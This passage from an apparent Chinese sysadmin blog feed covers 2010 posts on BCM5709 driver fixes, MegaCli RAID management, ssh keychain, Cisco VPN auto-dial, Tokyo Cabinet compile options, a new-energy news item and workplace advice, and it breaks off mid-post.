      <url>/2010/07/23/rhel5-4-and-bcm5709-network-card-drivers/</url>
      <content type="html"><![CDATA[<p>前段时间最折腾的事莫属：RHEL5.4和BCM5709网卡驱动问题。</p><p>系统：rhel5.4 64bit</p><p>服务器：DELL R710</p><p>默认RHEL5.4 64bit的驱动对BCM5709的网卡支持不好，网卡一遇到流量比较大就会hung up，后来不得已去dell官方去寻找驱动，同时将kernel降级为：2.6.18-128.el5（系统安装好后，我做了一个kernel的升级）这样就没有出现过hung up的情况。</p><p>既然64bit有问题，32bit的也是逃脱不了。</p><p><a href="http://hi.baidu.com/farmerluo" target="_blank" rel="noopener">阿辉</a> Says:<br><a href="http://www.ourlinux.net/life/rhel54-bcm5709-nic-drivers-problem/#comment-3460" target="_blank" rel="noopener">一月 7th, 2010 at 17:42</a></p><p>我也碰到过这个问题，我是这么做的，用内核自带的驱动，关闭acpi:<br>vi /boot/grub/grub.conf<br>title CentOS (2.6.18-164.6.1.el5)<br>root (hd0,0)<br>kernel /vmlinuz-2.6.18-164.6.1.el5 ro root=/dev/VolGroup00/LogVol00 rhgb quiet acpi=off noapic<br>initrd /initrd-2.6.18-164.6.1.el5.img</p><p><a href="http://hi.baidu.com/farmerluo" target="_blank" rel="noopener">阿辉</a> Says:<br><a href="http://www.ourlinux.net/life/rhel54-bcm5709-nic-drivers-problem/#comment-3461" target="_blank" rel="noopener">一月 7th, 2010 at 17:43</a></p><p>最高跑到过300多M，没有出过问题了。</p><p><a href="http://www.ourlinux.net/" target="_blank" rel="noopener">bixuan</a> Says:<br><a href="http://www.ourlinux.net/life/rhel54-bcm5709-nic-drivers-problem/#comment-3462" target="_blank" rel="noopener">一月 7th, 2010 at 17:47</a></p><p>是的，关闭acpi也是可以的，多谢分享，呵呵</p><p>今天实然接到通知，说服务器上的服务down了，因为在外面无法查看，过了一会同事又说是因为网络不通重启了网卡又正常了。回到家上服务器进行检查，没有报错，也没有发现什么系统的异常。觉得比较奇怪就上网搜索了一下，发现也有人遇到了Broadcom BCM5709在centos系统出现网卡不工作的情况。重新安装网卡驱动，只能再观察是否还会再出现这种情况。  </p><p>lspci<br>01:00.0 Ethernet controller: Broadcom Corporation NetXtreme II BCM5709 Gigabit Ethernet (rev 20)<br>01:00.1 Ethernet controller: Broadcom Corporation NetXtreme II BCM5709 Gigabit Ethernet (rev 20)<br>02:00.0 Ethernet controller: Broadcom Corporation NetXtreme II BCM5709 Gigabit Ethernet (rev 20)<br>02:00.1 Ethernet controller: Broadcom Corporation NetXtreme II BCM5709 Gigabit Ethernet (rev 20)  </p><p>ethtool -i eth1<br>driver: bnx2<br>version: 1.9.3<br>firmware-version: 5.0.11 NCSI 2.0.5<br>bus-info: 0000:01:00.1  </p><p>下载kernel-devel和网卡新驱动<br>rpm -ivh kernel-devel-2.6.18-164.11.1.el5.x86_64.rpm<br>cd /usr/local/src/Server/Linux/Driver/netxtreme2-5.2.50<br>make &amp;&amp; make install<br>rmmod bnx2;modprobe bnx2<br>ethtool -i eth1<br>driver: bnx2<br>version: 2.0.8b<br>firmware-version: 5.0.12 bc 5.0.11 NCSI 2.0.5<br>bus-info: 0000:01:00.1</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>新兴能源发展规划将增5万亿投资 正上报国务院</title>
      <link href="/2010/07/21/the-new-energy-development-plan-will-add-5-trillion-to-the-state-department/"/>
      <url>/2010/07/21/the-new-energy-development-plan-will-add-5-trillion-to-the-state-department/</url>
      <content type="html"><![CDATA[<p>2010年07月21日07:24<a href="http://www.jjckb.cn/" target="_blank" rel="noopener">经济参考报</a>周玉洁</p><p>国家能源局7月20日表示，为了推进新兴能源产业的发展并完成截至2020年的碳减排目标，能源局组织编制了规划期为2011-2020年的新兴能源产业发展规划(以下简称“规划”)，将累计增加直接投资5万亿元。</p><p>据国家能源局规划发展司司长江冰介绍，“规划”对先进核能、风能、太阳能、生物质能、地热能、非常规天然气等<a href="http://stockhtm.finance.qq.com/hcenter/index.htm?page=1020169" target="_blank" rel="noopener">新能源</a>和可再生能源的开发利用、洁净煤、智能电网、分布式能源、车用新能源等能源新技术的产业化应用的具体实施路径、发展规模以及重大政策举措做了明确部署。初步测算，该“规划”实施以后，到2020年将大大减缓对煤炭需求的过度依赖，能使当年的二氧化硫排放减少约780万吨，当年的二氧化碳排放减少约12亿吨，同时每年增加产值1.5万亿元，增加社会就业岗位1500万个。江冰表示“规划”经历了多次修改和完善，目前正在按照有关程序准备上报国务院审批。</p><p>此外，为了更好的推进<a href="http://stockhtm.finance.qq.com/hcenter/index.htm?page=1020195" target="_blank" rel="noopener">节能减排</a>工作，目前国家能源局也正在组织有关单位对“十二五”能源发展规划进行编制。规划重点将围绕实现中央提出的非化石能源比重和碳减排“两个目标”展开。总体规划主要是对规划期内能源供需的总量平衡、总体布局、结构调整、节能减排、技术进步和体制改革以及关系全局的重大建设项目做出统一安排。</p><p>“十二五”期间能源结构调整的重点任务包括采取有效措施加大节能力度，提高传统清洁能源利用水平；加大天然气等清洁能源的利用规模；加快推进水电和核电的开发建设，积极做好风能、太阳能、生物质能等可再生能源的转化利用；统筹规划重点能源基地和跨区能源输送通道建设，促进能源资源优化配置。</p><p>国家能源局预计，到2015年，天然气利用规模可能会达到2600亿立方米，在能源消费结构中的比例预计将从目前的3 .9%提高到8 .3%左右；水电和核电占一次能源消费的比重将由现在的7%左右达到接近9%，水电利用规模可能达到2.5亿千瓦，核电利用规模达到3900万千瓦；风电、太阳能和生物质能占一次能源的消费由现在的0.8%达到接近2.6%左右。非水能可再生能源利用规模将达到1.1亿吨标准煤，占一次能源消费总量的比重提高1.8个百分点。届时我国非化石能源占一次能源的消费比重将有望达到11%左右。</p><p>据初步测算，到2020年完成非化石能源消费占比15%的目标，核电规模至少达到7500万千瓦以上，水电装机规模至少达到3亿千瓦以上，其他生物质能的利用规模应该达到2.4亿吨标准煤以上。江冰指出，重点要发展三类非化石能源，也就是核电、水电、非水能的其他非化石能源，包括风能、太阳能、生物质能。由于关系到我国能否完成目标的相关项目如大型水电和核电站的建设都需要较长的周期，这些项目都要在“十二五”期间基本开工建设，才能保证到2020年取得运行。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MegaCli查看dell硬件raid</title>
      <link href="/2010/07/15/megacli-looks-at-dell-hardware-raid/"/>
      <url>/2010/07/15/megacli-looks-at-dell-hardware-raid/</url>
      <content type="html"><![CDATA[<p>1、准备  </p><p>新版本的 MegaCli-1.01.24-0.i386.rpm 会把程序安装在/opt下，可以自定义安装目录，例如：</p><p>rpm –relocate /opt/=/usr/sbin/ -i MegaCli-1.01.24-0.i386.rpm</p><p>即把安装目录 /opt 替换成 /usr/sbin。</p><p>查看所有物理磁盘信息  </p><p>MegaCli -PDList -aALL</p><p>Adapter #0</p><p>Enclosure Number: 1<br>Slot Number: 5<br>Device Id: 5<br>Sequence Number: 2<br>Media Error Count: 0<br>Other Error Count: 0<br>Predictive Failure Count: 0<br>Last Predictive Failure Event Seq Number: 0<br>Raw Size: 140014MB [0x11177328 Sectors]<br>Non Coerced Size: 139502MB [0x11077328 Sectors]<br>Coerced Size: 139392MB [0x11040000 Sectors]<br>Firmware state: Hotspare<br>SAS Address(0): 0x5000c50008e5cca9<br>SAS Address(1): 0x0<br>Inquiry Data: SEAGATE ST3146855SS     S5273LN4Y1X0<br>…..</p><p>2、查看磁盘缓存策略  </p><p>MegaCli -LDGetProp -Cache -L0 -a0</p><p>Adapter 0-VD 0: Cache Policy:WriteBack, ReadAheadNone, Direct</p><p>or</p><p>MegaCli -LDGetProp -Cache -L1 -a0</p><p>Adapter 0-VD 1: Cache Policy:WriteBack, ReadAheadNone, Direct</p><p>or</p><p>MegaCli -LDGetProp -Cache -LALL -a0</p><p>Adapter 0-VD 0: Cache Policy:WriteBack, ReadAheadNone, Direct<br>Adapter 0-VD 1: Cache Policy:WriteBack, ReadAheadNone, Direct</p><p>or</p><p>MegaCli -LDGetProp -Cache -LALL -aALL</p><p>Adapter 0-VD 0: Cache Policy:WriteBack, ReadAheadNone, Direct<br>Adapter 0-VD 1: Cache Policy:WriteBack, ReadAheadNone, Direct</p><p>or</p><p>MegaCli -LDGetProp -DskCache -LALL -aALL</p><p>Adapter 0-VD 0: Disk Write Cache : Disk’s Default<br>Adapter 0-VD 1: Disk Write Cache : Disk’s Default</p><p>3、设置磁盘缓存策略  </p><p>缓存策略解释：</p><p>WT    (Write through<br>WB    (Write back)<br>NORA  (No read ahead)<br>RA    (Read ahead)<br>ADRA  (Adaptive read ahead)<br>Cached<br>Direct</p><p>例子：</p><p>MegaCli -LDSetProp WT|WB|NORA|RA|ADRA -L0 -a0</p><p>or</p><p>MegaCli -LDSetProp -Cached|-Direct -L0 -a0</p><p>or</p><p>enable / disable disk cache</p><p>MegaCli -LDSetProp -EnDskCache|-DisDskCache -L0 -a0</p><p>4、创建/删除 阵列<br>4.1 创建一个 raid5 阵列，由物理盘 2,3,4 构成，该阵列的热备盘是物理盘 5  </p><p>MegaCli -CfgLdAdd -r5 [1:2,1:3,1:4] WB Direct -Hsp[1:5] -a0</p><p>4.2 创建阵列，不指定热备  </p><p>MegaCli -CfgLdAdd -r5 [1:2,1:3,1:4] WB Direct -a0</p><p>4.3 删除阵列  </p><p>MegaCli -CfgLdDel -L1 -a0</p><p>4.4 在线添加磁盘  </p><p>MegaCli -LDRecon -Start -r5 -Add -PhysDrv[1:4] -L1 -a0</p><p>意思是，重建逻辑磁盘组1，raid级别是5，添加物理磁盘号：1:4。重建完后，新添加的物理磁盘会自动处于重建(同步)状态，这个 时候 fdisk -l是看不到阵列的空间变大的，只有在系统重启后才能看见。如果该阵列下只有一个分区的话，那么该分区也直接增大，如果有多个分区，不知道该怎么分配新增 空间了？有空试试看，呵呵</p><p>5、查看阵列初始化信息<br>5.1 阵列创建完后，会有一个初始化同步块的过程，可以看看其进度。  </p><p>MegaCli -LDInit -ShowProg -LALL -aALL</p><p>或者以动态可视化文字界面显示</p><p>MegaCli -LDInit -ProgDsply -LALL -aALL</p><p>5.2 查看阵列后台初始化进度  </p><p>MegaCli -LDBI -ShowProg -LALL -aALL</p><p>或者以动态可视化文字界面显示</p><p>MegaCli -LDBI -ProgDsply -LALL -aALL</p><p>6、创建全局热备  </p><p>指定第 5 块盘作为全局热备</p><p>MegaCli -PDHSP -Set [-EnclAffinity] [-nonRevertible] -PhysDrv[1:5] -a0</p><p>也可以指定为某个阵列的专用热备</p><p>MegaCli -PDHSP -Set [-Dedicated [-Array1]] [-EnclAffinity] [-nonRevertible] -PhysDrv[1:5] -a0</p><p>7、删除全局热备  </p><p>MegaCli -PDHSP -Rmv -PhysDrv[1:5] -a0</p><p>8、将某块物理盘下线/上线  </p><p>MegaCli -PDOffline -PhysDrv [1:4] -a0</p><p>MegaCli -PDOnline -PhysDrv [1:4] -a0</p><p>9、查看物理磁盘重建进度  </p><p>MegaCli -PDRbld -ShowProg -PhysDrv [1:5] -a0</p><p>或者以动态可视化文字界面显示</p><p>MegaCli -PDRbld -ProgDsply -PhysDrv [1:5] -a0</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>上班奴特征</title>
      <link href="/2010/07/14/office-slave-characteristics/"/>
      <url>/2010/07/14/office-slave-characteristics/</url>
      <content type="html"><![CDATA[<p>上班奴特征之一：工作不会让你把握自己的命运，恰恰相反，去工作 就是把命运交给别人掌控。</p><p>　　解决之道：职场是以权力为中心的，权力越大的人就越能掌握你的命运，所以要和拥有权力的人搞好<a href="http://action.utops.cc/click.jsp?adsId=412&amp;adsLeagueId=5&amp;adsUserId=1&amp;siteId=383&amp;siteLeagueId=5&amp;siteUserId=310&amp;scId=1&amp;adsType=98&amp;prices=1.51&amp;checkCode=023b994ee76651093ab1a2ad861218a0_122.226.213.10&amp;click=1&amp;url=http%3A/www.foho.cc/totole/index.html&amp;v=0&amp;keyword=%u5173%u7CFB&amp;s=http%3A/yesee.qianlong.com/3910/2010/07/09/156@5873035.htm&amp;rn=207639---2010-7-13-21:13:10" target="_blank" rel="noopener">关系</a>，这才 是立身之道。</p><p>上班奴特征之二：你 一定会遇到有背景有来历的同事，不管你做什么都无法超越他们。</p><p>　　解决之道：有背景家世的人，通常前期都会发展的很好，但他们只能达到某一个平台就止步不前了。他们很 难有超过家世背景的发展，但对于普通人来说，起步虽然难，但能达到的高度却难以限制。所以，没有背景的人，将是后发先至的命运。撑过最早一段时间，不要认 输就<a href="http://action.utops.cc/click.jsp?adsId=429&amp;adsLeagueId=5&amp;adsUserId=1&amp;siteId=383&amp;siteLeagueId=5&amp;siteUserId=310&amp;scId=1&amp;adsType=98&amp;prices=1.51&amp;checkCode=a3c637081e8ed0143dbd0ae65966d7c6_122.226.213.10&amp;click=1&amp;url=http%3A/www.totole.com.cn&amp;v=0&amp;keyword=%u53EF%u4EE5&amp;s=http%3A/yesee.qianlong.com/3910/2010/07/09/156@5873035.htm&amp;rn=763036---2010-7-13-21:13:10" target="_blank" rel="noopener">可以</a>。</p><p>上班奴特征之三：需 要你时人人对你很好，不需要你时没人答理。</p><p>　　解决之道：职场是一个交换利益的场所，所有人进入这个地方，都是为了获得利益和交换利益。大家都不是 来交朋友的，如果你对别人没好处，又怎么会有人来搭理你呢？所以最好的状态时让自己变得对所有人都有用，但却又不会很容易被人利用。</p><p>上班奴特征之四：做 人越好，就越容易受欺负。</p><p>　　解决之道：职场里，所有人都是自私的，因为大家都要攫取自己的利益。如果你做人太好，太无私的话，你 应得的利益就会被别人抢去，你会持续不断的受到自私者的起伏。所以你可以不做坏人，但至少要对人有所防备。</p><p>上班奴特征之五：不 管你做得多辛苦，始终都不会有人认同你。</p><p>　　解决之道：做的辛苦不代表就会得到认同。因为上司有上司想要的结果，老板有老板想要的结果，他们不会 看下属是怎么做的，也不会看到别人多辛苦，只会看这个结果对自己有没有用。所以，要尽可能的把时间精力放在对上司有好处的事情里，这样才能获得认同。</p><p>上班奴特征之六：做 得好不如说得好，说得好不如夸得好。</p><p>　　解决之道：在职场里，光会做是没用的，因为别人没看到，你做了也是白做。所以做完事情后，一定要学会 汇报，并且要按照上司的喜好、利益来进行汇报。说的好，往往比做的好还要有效。</p><p>上班奴特征之七：上 司答应你的事情，说变卦就变卦，完全没有信用。</p><p>　　解决之道：上司只会记得和他利益息息相关的事情，与他无关的事情会被忘到九霄云外去。当初答应你，是 因为当初你对他有用，现在变卦了，是因为你的价值用完了。所以，最好的方式是把上司的利益和自己挂钩，然后尽快兑现好处，拿钱时手一定要快，拿到了的才是 你的。</p><p>上班奴特征之八：每 天为忙而忙，与当初的理想越来越远。&lt; /span&gt;</p><p>　　解决之道：老板花钱雇你，不是让你实现你的理想，而是让你实现老板的理想，你受雇佣的时间越长，与自 己理想就会越远。解决方法也很简单，就是做老板的事情是一回事儿，而实现自己的理想也不要放下。把你的理想拆碎成很小的步骤，然后每天做一点，日积月累， 就会 越来越接近。</p><p>上班奴特征之九：你 不想做小人，但小人却总能爬到你头上。</p><p>　　解决之道：职场里拼的不是人品，而是权力。你有道德有人品，可是小人们却会捧上司会讨好上司。最后你 的人品没有发挥作用，而小人的权力却可以让他爬到你头上。所以，你想要防备小人，就一定要让自己和权力绑在一起，这才是最好的护身符。</p><p>上班族特征之十：你 是上司的私人物品，宁可闲置，也不能让别人用。</p><p>　　解决之道：上司的权力就是管理下属，所以每个下属都是他的私人物品，就算自己不用，也不准别人染指。 所以你想离开上司控制的时候，就一定要走的坚决，不可以犹豫。心里有一丝犹豫都不要表露出想走的迹象。</p><p>上班奴特征之十一： 好事都是别人做，出事却要你负责。</p><p>　　解决之道：职场里每个人都是自私的，所以大家都会趋利避害。如果你不这么做，那么好事情永远都会被人 抢走，坏事情永远都落在你头上。所以，职场里一定要守住自己的底线，对你有好处的才做，出事要你负责的事情决不能碰。</p><p>上班奴特征之十二： 是不是你想事业有成却总怀才不遇？是不是想混日子却总有做不完的事情？</p><p>　　解决之道：职场是围绕着权力转而不是围绕着你转的，所以它不会因为你的想法儿产生什么改变。上司不会 因为你想要事业有成而给你事情做，更不会因为你想偷懒儿不给你事情做。只有与上司有良好的互动，搞好了关系，才可以心想事成。</p><p>上班奴特征之十三： 你做事再好，也比不上别人关系好。</p><p>　　解决之道：做事的人，永远比不上有权的人。上司们虽然也需要有人做事做的好，但他们更怕得罪高层。当 你用尽力气干活时，高层一句话就能把你给抵消掉。唯一的方法，就是让自己越来越有权力，成为别人的靠山。</p><p>上班奴特征之十四： 你不想针对别人，别人却总把你当成对手。</p><p>　　解决之道：职场是一个零和游戏，利益总量只有那么多，被你拿走了，别人就没有。不需要你把别人当对 手，你的存在，就已经是其他人的威胁了。所以，职场就是不停的战斗，敌人总是源源不绝的。</p><p>上班奴特征之十五： 再严格的规章制度都不如上司的一句话有效。</p><p>　　解决之道：不信规则信上司。</p><p>上班奴特征之十六： 品德越好的人敌人越多。</p><p>　　解决之道：品德好的人，意味着在职场里好欺负。而好欺负的人敌人一定会多。从另一方面来说，职场上当 权的都是品德差的人，而品德好的人出现，则产生了对比，会让当权者们嫉恨，最后产生了劣币驱逐良币的现象。最好的办法是，你要让自己有缺点，哪怕是伪装一 个缺点出来，不能令自己过于完美。</p><p>上班奴特征之十七： 你的付出和收入永远都不成正比。</p><p>　　解决之道：老板赚的就是剩余价值，让你付出越多，给你越少，老板赚的就越多。所以，一定要牢牢守住自 己的利益，寸步不让。</p><p>上班奴特征之十八： 你不跟上司要加薪，就没人给你加薪。</p><p>　　解决之道：任何老板都不会主动为员工加薪的，因为最好的状态的就是员工少拿钱多干活。所以，必须要让 老板知道你需要加薪需要认同的心态，并且付诸实施。</p><p>上班奴特征之十九： 笨蛋总能做你上司。</p><p>　　解决之道：他们之所以能成为你的上司，靠的不是能力，而是时间和关系。所以你能力比上司强并没有用 处，即使上司是笨蛋也很正常，只要他有足够的时间、关系，就能一直牢牢把握权柄。所以，千万不要关注上司有多少能力，而要发现他们的优点，学习他们的优 点。</p><p>上班奴特征之二十： 上司们在斗争，牺牲的却是你。</p><p>　　解决之道：上司们是棋手，而你就是棋子，当他们不能互相战胜对方时，牺牲的肯定是棋子。所以，尽可能 的离开战局，或者成为上司手里最重要的筹码，让他们不舍得牺牲你。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>利用 keychain 处理 ssh 验证</title>
      <link href="/2010/07/01/use-keychain-to-handle-ssh-validation/"/>
      <url>/2010/07/01/use-keychain-to-handle-ssh-validation/</url>
      <content type="html"><![CDATA[<p>keychain 是ssh-agent 的前端，使用起来比 ssh-agent 更为友好。</p><p>keychain ~/.ssh/id_dsa<br> KeyChain 2.6.8; <a href="http://www.gentoo.org/proj/en/keychain/" target="_blank" rel="noopener">http://www.gentoo.org/proj/en/keychain/</a><br> Copyright 2002-2004 Gentoo Foundation; Distributed under the GPL<br>  * Inheriting ssh-agent (819)<br>  * Initializing /home/centeur/.keychain/centeur.justmymemo.com-sh file…<br>  * Initializing /home/centeur/.keychain/centeur.justmymemo.com-csh file…<br>  * Initializing /home/centeur/.keychain/centeur.justmymemo.com-fish file…<br>  * Adding  1 ssh key(s)…<br> Enter passphrase for /home/centeur/.ssh/id_dsa:<br> Identity added: /home/centeur/.ssh/id_dsa (/home/centeur/.ssh/id_dsa)</p><p>. ~/.keychain/centeur.justmymemo.com-sh  </p><p>#现在登录 ssh 就不用输入通行字了</p><p>如何自动开始 keychain？</p><p>echo ‘keychain -q ~/.ssh/id_dsa’ &gt;&gt; ~/.bashrc<br>echo ‘. ~/.keychain/centeur.justmymemo.com-sh’ &gt;&gt; ~/.bashrc</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cisco vpn client自动拨号的实现</title>
      <link href="/2010/06/24/the-implementation-of-cisco-vpn-client-automatic-dialing/"/>
      <url>/2010/06/24/the-implementation-of-cisco-vpn-client-automatic-dialing/</url>
      <content type="html"><![CDATA[<p>cisco vpn client自动拨号的功能，可以通过修改vpn client配置文件实现：  </p><h1 id="修改文件：vpn-client安装目录下（一般为C-Program-Files-Cisco-Systems-VPN-Client-）vpnclient-ini和qz-pcf-就是你connection-Entry中名的名字"><a href="#修改文件：vpn-client安装目录下（一般为C-Program-Files-Cisco-Systems-VPN-Client-）vpnclient-ini和qz-pcf-就是你connection-Entry中名的名字" class="headerlink" title="修改文件：vpn client安装目录下（一般为C:\Program Files\Cisco Systems\VPN Client\）vpnclient.ini和qz.pcf(就是你connection Entry中名的名字)  "></a>修改文件：vpn client安装目录下（一般为C:\Program Files\Cisco Systems\VPN Client\）vpnclient.ini和qz.pcf(就是你connection Entry中名的名字)  </h1><p>对vpnclient.ini修改如下：<br>在[main]下增加如下几项：(增加完成这几项后，你的VPN Client的option下就会增加一项：automatic vpn initiation)<br>AutoInitiationEnable=1 ————自动重拨(1为启动，0为关闭)<br>AutoInitiationRetryInterval=5 ————断开后自动重拨前等待的时间<br>AutoInitiationRetryIntervalType=1 ————重拨的时间单位(0为分钟，1为秒)<br>AutoInitiationList=qz ————要自动重拨的对象<br>末尾增加如下几项：<br>[qz]<br>network=192.168.0.0 ———–本地网卡的地址范围<br>mask=255.255.0.0 ———–本地网卡的地址掩码<br>ConnectionEntry=qz ———–要自动重拨的对象<br>connect=1 ———–启动或关闭自动重拨</p><p>===============================<br>对你要实现自动重拨的对象文件修改如下，我这里是qz.pcf，在C:\Program Files\Cisco Systems\VPN Client\Profiles，<br>找到这三行(原来是这样的)<br>Username=user<br>SaveUserPassword=0<br>UserPassword=<br>你如果想保存密码，并且实现自动输入密码(不安全，但很方便)，修改成如下：<br>Username=cisco ————-(你的用户名)<br>SaveUserPassword=1<br>UserPassword=12345 ————-(你的用户密码)</p><p>保存后，一定要将PCF文件的属性改为只读，很重要，修改完这些配置之后，启动VPN CLIENT，然后到option选项中，选择Windows Logon Properties，并勾选Enable start before logon，重启就OK了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>解决SecureCRT中文版恼人的防火墙错误提示</title>
      <link href="/2010/06/23/solve-the-annoying-firewall-error-message-in-securecrt/"/>
      <url>/2010/06/23/solve-the-annoying-firewall-error-message-in-securecrt/</url>
      <content type="html"><![CDATA[<p>接连用了几款X版的SecureCRT汉化版都发现有个问题，在连接远程服务器的时候总是会弹出一个提示：数据库里没找到防火墙“无”。此会话将尝试不通过防火墙进行连接。</p><p>虽然不是大问题，但是每次远程连接的时候总弹出这个提示框，很是让我恼火。Google下，有人说可以修改相应Session的配置文件：将配置文件中的”Firewall Name”=None修改成”Firewall Name”=无。依葫芦画瓢改完后，发现这该死的提示框还是弹了出来，看来只好创建一个真正的防火墙“无”来解决这个问题了。</p><p>首先打开SecureCRT的配置文件目录（可以从全局配置里面找到）</p><p><a href="http://aiur.me/wp-content/uploads/2010/05/sercurecrtconfig1.jpg" target="_blank" rel="noopener"></a> 找到配置目录后，进入FireWalls的文件夹（如果没有该文件夹的话则新建一个）然后创建一个名为“无.ini”的空文件，这样就等于在数据库中建立了一个叫“无”的防火墙</p><p>这样来远程连接时就不会再弹出恼人的提示信息了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>对于错误“不能确定应用到此机器的组策略安全性设置”的解决办法</title>
      <link href="/2010/06/23/the-solution-to-the-error-cannot-determine-the-group-policy-security-settings-that-apply-to-this-machine/"/>
      <url>/2010/06/23/the-solution-to-the-error-cannot-determine-the-group-policy-security-settings-that-apply-to-this-machine/</url>
      <content type="html"><![CDATA[<p>访问本地安全策略分支时，提示如下信息：<br>不能确定应用到此机器的组策略安全性设置。<br>在尝试从本地安全性数据库（%windir%\security\database\secedit.sdb）中检索这些设置时返回的错误为：参数不正确。<br>所有本地安全性设置都将被显示，但是不会指出一个给定的安全性设置是否由组策略定义。<br>所有由此用户界面改动的本地安全性设置都可能随后被域级的策略覆盖。<br>按照网上的办法如下：<br>解决方案：  </p><p>1.切换到命令提示符状态。<br>2.执行“esentutl /k %windir%\Security\Database\Secedit.sdb”和“esentutl /g %windir%\Security\Database\Secedit.sdb”对secedit.sdb进行检查。<br>3.手工备份要修复的数据库文件。<br>4.执行“esentutl /p %windir%\Security\Database\Secedit.sdb”进行修复，系统会弹出Warning提示框：<br>“You should only run Repair on damaged or corrupted databases.Repair will not apply information in the transaction log files to the database,and may cause information to be lost.Do you wish to proceed?”<br>单击OK，开始修复。<br>if (\$ != jQuery) { $ = jQuery.noConflict(); }</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ttserver在32位上突破2G限制</title>
      <link href="/2010/06/21/ttserver-broke-the-2g-limit-on-32-bits/"/>
      <url>/2010/06/21/ttserver-broke-the-2g-limit-on-32-bits/</url>
      <content type="html"><![CDATA[<p><a href="http://www.1978th.net/tokyocabinet/" target="_blank" rel="noopener">Tokyo Cabinet</a> 是日本人 平林幹雄 开发的一款 DBM 数据库，该数据库读写非常快，哈希模式写入100万条数据只需0.643秒，读取100万条数据只需0.773秒，是 Berkeley DB 等 DBM 的几倍。<br><a href="http://www.1978th.net/tokyotyrant/" target="_blank" rel="noopener">Tokyo Tyrant</a> 是由同一作者开发的 Tokyo Cabinet 数据库网络接口。它拥有Memcached兼容协议，也可以通过HTTP协议进行数据交换。  </p><p>　　Tokyo Tyrant 加上 Tokyo Cabinet，构成了一款支持高并发的分布式持久存储系统，对任何原有Memcached客户端来讲，可以将Tokyo Tyrant看成是一个Memcached，但是，它的数据是可以持久存储的。这一点，跟新浪的<a href="http://memcachedb.org/" target="_blank" rel="noopener">Memcachedb</a>性质一样。  </p><p>　　<strong>相比Memcachedb而言，Tokyo Tyrant具有以下优势：</strong>  </p><p>　　1、故障转移：Tokyo Tyrant支持双机互为主辅模式，主辅库均可读写，而Memcachedb目前支持类似MySQL主辅库同步的方式实现读写分离，支持“主服务器可读写、辅助服务器只读”模式。</p><p>　这里使用 $memcache-&gt;addServer 而不是 $memcache-&gt;connect 去连接 Tokyo Tyrant 服务器，是因为当 Memcache 客户端使用 addServer 服务器池时，是根据“crc32(key) % current_server_num”哈希算法将 key 哈希到不同的服务器的，PHP、C 和 python 的客户端都是如此的算法。Memcache 客户端的 addserver 具有故障转移机制，当 addserver 了2台 Memcached 服务器，而其中1台宕机了，那么 current_server_num 会由原先的2变成1。  </p><p>　　引用 memcached 官方网站和 PHP 手册中的两段话：  </p><p>引用</p><p><a href="http://www.danga.com/memcached/" target="_blank" rel="noopener">http://www.danga.com/memcached/</a><br>If a host goes down, the API re-maps that dead host’s requests onto the servers that are available.  </p><p><a href="http://cn.php.net/manual/zh/function.Memcache-addServer.php" target="_blank" rel="noopener">http://cn.php.net/manual/zh/function.Memcache-addServer.php</a><br>Failover may occur at any stage in any of the methods, as long as other servers are available the request the user won’t notice. Any kind of socket or Memcached server level errors (except out-of-memory) may trigger the failover. Normal client errors such as adding an existing key will not trigger a failover.</p><hr><p>　　2、日志文件体积小：Tokyo Tyrant用于主辅同步的日志文件比较小，大约是数据库文件的1.3倍，而Memcachedb的同步日志文件非常大，如果不定期清理，很容易将磁盘写满。  </p><hr><p>　　3、超大数据量下表现出色：  </p><p>但是，Tokyo Tyrant 也有缺点：在32位操作系统下，作为 Tokyo Tyrant 后端存储的 Tokyo Cabinet 数据库单个文件不能超过2G，而64位操作系统则不受这一限制。所以，如果使用 Tokyo Tyrant，推荐在64位CPU、操作系统上安装运行。  </p><p>——–在32位操作系统下，作为 Tokyo Tyrant 后端存储的 Tokyo Cabinet 数据库单个文件不能超过2G，而64位操作系统则不受这一限制。所以，如果使用 Tokyo Tyrant，推荐在64位CPU、操作系统上安装运行。—————<br>其实不用，在编译Tokyo cabinet的时候，使用如下编译选项就可以突破2G限制<br>–enable-off64<br>另附Tokyo cabinet编译参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Options of Configure  </span><br><span class="line">The following options can be specified with `./configure&apos;.  </span><br><span class="line">--enable-debug : build for debugging. Enable debugging symbols, do not perform optimization, and perform static linking.  </span><br><span class="line">--enable-devel : build for development. Enable debugging symbols, perform optimization, and perform dynamic linking.  </span><br><span class="line">--enable-profile : build for profiling. Enable profiling symbols, perform optimization, and perform dynamic linking.  </span><br><span class="line">--enable-static : build by static linking.  </span><br><span class="line">--enable-fastest : build for fastest run.  </span><br><span class="line">--enable-off64 : build with 64-bit file offset on 32-bit system.  </span><br><span class="line">--enable-swab : build for swapping byte-orders.  </span><br><span class="line">--enable-uyield : build for detecting race conditions.  </span><br><span class="line">--disable-zlib : build without ZLIB compression.  </span><br><span class="line">--disable-bzip : build without BZIP2 compression.  </span><br><span class="line">--disable-pthread : build without POSIX thread support.  </span><br><span class="line">--disable-shared : avoid to build shared libraries.</span><br></pre></td></tr></table></figure></p><p>　<strong>一、安装</strong><br>　　1、首先编译安装tokyocabinet数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 